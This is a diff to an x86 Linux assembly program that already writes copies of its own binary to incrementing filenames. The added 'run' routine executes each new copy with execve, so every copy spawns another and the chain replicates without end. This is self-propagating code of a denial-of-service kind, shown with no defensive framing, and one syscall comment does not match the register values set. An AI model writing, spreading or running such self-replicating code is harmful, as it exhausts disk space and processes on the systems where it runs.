@@ -60,6 +60,13 @@ inc_fname:      mov     ebx, fname              ; Move the pointer to filename i
                 mov     ebx, fname              ; Fix ebx into beginning of filename
                 ret
 
+run:            mov     eax, 11                 ; 11 = sys_execve
+                mov     ebx, fname              ; command
+                mov     ecx, 0                  ; no arguments
+                mov     edx, 0                  ; environment = NULL
+                int     0x80                    ; sys_execve(fname, fname, NULL)
+                ret
+
 replicate:      mov     eax, 5                  ; 5 = sys_open
                 call    inc_fname               ; Increment the filename
                 mov     ecx, 65                 ; 65 = O_WRONLY | O_CREAT
@@ -69,8 +76,10 @@ replicate:      mov     eax, 5                  ; 5 = sys_open
                 xchg    eax, ebx                ; Move the file descriptor in eax to ebx
                 xchg    eax, ecx                ; Swap eax and ecx
                 mov     cl, 0                   ; Point out to the beginning of the program by removing first 8 bits
-                mov     al, 4                   ; 4 = write syscall
+                mov     al, 4                   ; 4 = sys_write
                 int     0x80                    ; sys_write(file_descriptor, *content, filesize)
+                mov     eax, 6                  ; 6 = sys_close
+                int     0x80                    ; sys_close(file_descriptor)
                 ret
 
 exit:           mov     bl, 0                   ; 0 = Exit code
@@ -79,6 +88,7 @@ exit:           mov     bl, 0                   ; 0 = Exit code
 
 _start:         call    program
                 call    replicate
+                call    run
                 call    exit
 
 filesize        equ     $ - $$
